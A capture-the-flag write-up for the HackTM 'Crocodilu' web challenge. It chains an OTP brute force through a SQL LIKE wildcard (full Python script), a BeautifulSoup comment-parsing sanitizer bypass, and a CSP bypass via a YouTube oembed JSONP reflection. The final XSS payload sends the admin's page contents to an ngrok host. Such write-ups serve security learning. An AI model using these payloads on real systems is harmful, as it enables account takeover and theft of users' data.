---
description: CSP bypass through unsupported www.youtube.com JSONP endpoint
---

# Crocodilu

## Description

> Check out my new video sharing platform!

{% file src="../../.gitbook/assets/23-web-crocodilu-main.tar.gz" %}

## Solution

1. [Gaining access through SQL `LIKE` injection](crocodilu.md#gaining-access)
2. [Bypassing HTML sanitization through parser differential between BeautifulSoup and browsers](crocodilu.md#bypassing-html-sanitization)
3. [Bypassing strict CSP through unsupported `www.youtube.com` JSONP endpoint](crocodilu.md#abusing-youtube-jsonp-endpoint)

### Gaining Access

The first thing we needed to do was to gain access to the application. We can register a new user, but attempting to log in as that user would result in a "User not active" error.

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 6.06.25 PM.png" alt=""><figcaption></figcaption></figure>

Taking a look at `auth.py`, we would see that a successful password reset at `/reset_password` would set `user.active` to `True`, allowing us to access the app.

```python
def reset_password():

    ...
    
    if user and not user.admin:
        user.code = None
        user.password = generate_password_hash(password)
        user.active = True
        db.session.commit()
        return redirect(url_for('login'))
```

To do so, we first have to request an OTP at `/request_code`. This sets `user.code` to a random 4-digit number.

```python
def request_code():
    
    ...

    user = User.query.filter(User.email.like(email)).first()

    if user:
        if user.admin:
            return render_template('request_code.html',
                                   error='Admins cannot reset their password')

        user.code = ''.join(random.choices(string.digits, k=4))
        # TODO: send email with code, will fix this next release

        db.session.commit()

        return redirect(url_for('reset_password'))
    else:
        return render_template('request_code.html', error='Invalid email')
```

If no rate limiting is enforced on `/reset_password`, a 4-digit OTP would be trivial to brute-force. However, in this case, rate limiting is enforced on a per-email basis through a Redis store.

```python
email = request.form['email'].strip()
if not is_valid_email(email):
    return render_template('request_code.html', error='Invalid email')

reqs = redis.get(email)
if reqs is not None and int(reqs) > 2:
    return render_template('reset_password.html',
                           error='Too many requests')
else:
    if reqs is None:
        redis.set(email, '1')
    else:
        redis.incr(email)
    redis.expire(email, 3600)
```

When a guess at the OTP is made, the value for the corresponding email address is incremented by 1. After 3 attempts, any further attempts for the same email address are blocked.

Interestingly, the SQL query that checks the OTP code uses the `LIKE` operator.

```python
code = request.form['code'].strip()
if not code.isdigit():
    return render_template('reset_password.html', error='Invalid code')

password = request.form['password']
user = User.query.filter(User.email.like(email)
                         & User.code.like(code)).first()
```

The final query is something like

```sql
SELECT * FROM users WHERE email LIKE "email" AND code LIKE "code"
```

which means that if we can insert the `%` wildcard at the start or end of either `email` or `code`, there's a good chance we can bypass the check in reasonable time.

Unfortunately, `code` is checked using `code.isdigit()`. Let's see if we can get past `is_valid_email(email)` instead.

```python
def is_valid_email(email: str) -> bool:
    email_pattern = re.compile(r"[0-9A-Za-z]+@[0-9A-Za-z]+\.[a-z]+")
    return email_pattern.match(email) is not None
```

The regular expression does not allow for special characters like `%`. However, [re.match](https://docs.python.org/3/library/re.html) only matches at the _beginning_ of the string, so this still allows for wildcards at the _end_ of the email.

> If zero or more characters at the beginning of _string_ match the regular expression _pattern_, return a corresponding match object. Return `None` if the string does not match the pattern; note that this is different from a zero-length match.&#x20;

There are two possibilities here - the first one is to create many accounts sharing the same prefix in their emails, increasing the chance that any code would be valid for `some@email.prefix%`. Because the registration form is reCAPTCHA-protected, this is not possible.

The approach we take instead relies on the ability to add any number of `%` characters at the end of the email. Because `%` matches 0 or more characters, the query will yield the same result no matter how many `%` characters are added.

```python
import grequests
import sys

EMAIL = "socengexp@socengexp.socengexp"
PASSWORD = "socengexp12345!"

for i in range(0, 10000, 100):
    
    print(f"Trying {i}")

    results = grequests.map(grequests.post("http://34.141.16.87:25000/reset_password", data={
        "email": EMAIL + "%" * (i + j),
        "code": str(i + j).zfill(4),
        "password": PASSWORD
    }) for j in range(100))

    for r in results:
        if "Invalid email or code" not in r.text:
            print(r.text)
            sys.exit(0)
```

Using this script, we can brute force the entire OTP space within a few minutes.

### Bypassing HTML Sanitization

Now that we are in, where is the flag? When the container first starts up a post is made containing the flag. The post is admin-only, which means we need to stage a client-side attack against the admin.

```python
with app.app_context():
    db.create_all()
    if not User.query.filter(User.email.like('admin@hacktm.ro')).first():
        user = User(name='admin',
                    email='admin@hacktm.ro',
                    password=generate_password_hash(
                        os.getenv('ADMIN_PASSWORD', 'admin')),
                    active=True,
                    admin=True)
        db.session.add(user)
        post = Post(title='Welcome to Crocodilu', content=os.getenv('FLAG', 'HackTM{example}'), author=user)
        db.session.add(post)
        db.session.commit()
```

Our first hurdle is [BeautifulSoup](https://beautiful-soup-4.readthedocs.io/en/latest/). Our HTML content is parsed and checked for any blacklisted tags. Combined with a restrictive CSP, this greatly restricts what we can do.

```python
@app.route('/create_post', methods=['GET', 'POST'])
@login_required
def create_post():
    blacklist = ['script', 'body', 'embed', 'object', 'base', 'link', 'meta', 'title', 'head', 'style', 'img', 'frame']

    if current_user.admin:
        return redirect(url_for('profile'))
    form = PostForm()
    if form.validate_on_submit():
        content = form.content.data
        soup = BeautifulSoup(content, 'html.parser')
        for tag in blacklist:
            if soup.find(tag):
                content = 'Invalid YouTube embed!'
                break

        for iframe in soup.find_all('iframe'):
            if iframe.has_attr('srcdoc') or not iframe.has_attr('src') or not iframe['src'].startswith('https://www.youtube.com/'):
                content = 'Invalid YouTube embed!'
                break

        post = Post(title=form.title.data,
                    content=content,
                    author=current_user)
        db.session.add(post)
        db.session.commit()
        flash('Your post has been created!', 'success')
        return redirect(url_for('profile'))
    return render_template('create_post.html', title='Create Post', form=form)
```

Luckily for us, the built-in `html.parser` does not treat malformed HTML the same way as a standards-compliant HTML5 parser would. There is a [section](https://beautiful-soup-4.readthedocs.io/en/latest/#differences-between-parsers) dedicated to this in the documentation.

One trick to exploit this parser differential is through HTML comments. Consider the following payload:

```
<!--><script>alert(1)</script>-->
```

BeautifulSoup thinks that the comment spans the entire payload, ending at `-->`.

```python
>>> from bs4 import BeautifulSoup
>>> BeautifulSoup("<!--><script>alert(1)</script>-->", "html.parser").find_all()
[]
```

However, a HTML5 parser would accept `<!-->` as a valid comment. We can test this out on any modern browser using a [DOM viewer](https://software.hixie.ch/utilities/js/live-dom-viewer/).

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 7.37.24 PM.png" alt=""><figcaption></figcaption></figure>

### Abusing YouTube JSONP Endpoint

Now that we can inject arbitrary HTML, we have to get past the rather restrictive CSP that is applied on all pages through the Nginx proxy.

{% code overflow="wrap" %}
```properties
add_header Content-Security-Policy "default-src 'self' www.youtube.com www.google.com/recaptcha/ www.gstatic.com/recaptcha/ recaptcha.google.com/recaptcha/; object-src 'none'; base-uri 'none';";
```
{% endcode %}

Throwing this into Google's [CSP evaluator](https://csp-evaluator.withgoogle.com/) shows us that `www.youtube.com` might host JSONP endpoints that we can abuse.

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 7.22.54 PM.png" alt=""><figcaption></figcaption></figure>

If so, we could use something like&#x20;

<pre class="language-html"><code class="lang-html"><strong>&#x3C;script src="https://www.youtube.com/some_jsonp_endpoint?callback=alert">&#x3C;/script> 
</strong></code></pre>

to achieve an XSS.

But _where_? The evaluator is checking against a pre-defined list of known JSONP endpoints [here](https://github.com/google/csp-evaluator/blob/master/allowlist\_bypasses/json/jsonp.json). The only one that matches `www.youtube.com` is:

```
"//www.youtube.com/profile_style"
```

which seems to be outdated because visiting that URL just brings us to a YouTube profile called "Profile Style".

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 7.26.26 PM.png" alt=""><figcaption></figcaption></figure>

At this point, I tried getting Burp Suite to insert a `callback=` parameter to all JSON endpoints requested using an extension like [this one](https://github.com/kapytein/jsonp) and using YouTube as a normal user, hoping to get lucky.

Alas, this did not yield any results. After sleeping off my frustration, I came back to this challenge when my teammate sent a link to an obscure issue on [Google's issue tracker](https://issuetracker.google.com/issues/35171971).

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 7.36.27 PM.png" alt=""><figcaption></figcaption></figure>

This didn't seem very helpful. After all, Google decided _not_ to implement JSONP on the `/oembed` API, right? Using the `callback` parameter seems to have no effect.

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 7.39.55 PM.png" alt=""><figcaption></figcaption></figure>

But when I randomly tried using `alert();` instead of `alert`, the following response was returned.

{% code overflow="wrap" %}
```javascript
// API callback
alert();({
  "error": {
    "code": 400,
    "message": "Invalid JSONP callback name: 'alert();'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed.",
    "status": "INVALID_ARGUMENT"
  }
}
);
```
{% endcode %}

Wait, did I just trigger a JSONP response? For some reason, using a "valid" callback name does not elicit a JSONP response, but an "invalid" one yields a JSONP response saying that the callback name is invalid. That's really weird and ironic.

With our `callback` parameter reflected into the response, we can now inject arbitrary JavaScript code. The only restrictions are that quotes and angle brackets are escaped.

To exfiltrate the contents of the admin's `/profile` page, the following `callback` value can be used.

{% code overflow="wrap" %}
```javascript
&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?` btoa(txt)})
```
{% endcode %}

Combined with the BeautifulSoup bypass above, the final payload we submit is:

{% code overflow="wrap" %}
```
<!--><script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>-->
```
{% endcode %}

We can then find the URL of the post containing the flag:

```html
...

<h1>admin's Posts</h1>
<ul class="list-group">
    
    <li class="list-group-item">
        <a href="/post/68a30ae2-a8f3-4d12-9ffa-0564a3a7177b">Welcome to Crocodilu</a>
        <span class="float-right">2023-02-18</span>
    </li>
    
</ul>

...
```

and repeat this one more time to fetch `/post/68a30ae2-a8f3-4d12-9ffa-0564a3a7177b` instead.

```markup
...

<article class="media content-section">
  <div class="media-body">
    <h2>Welcome to Crocodilu</h2>
    <p class="article-content">HackTM{trilulilu_crocodilu_xssilu_9bc3af}</p>
    <small class="text-muted">2023-02-18</small>
  </div>
</article>

...
```
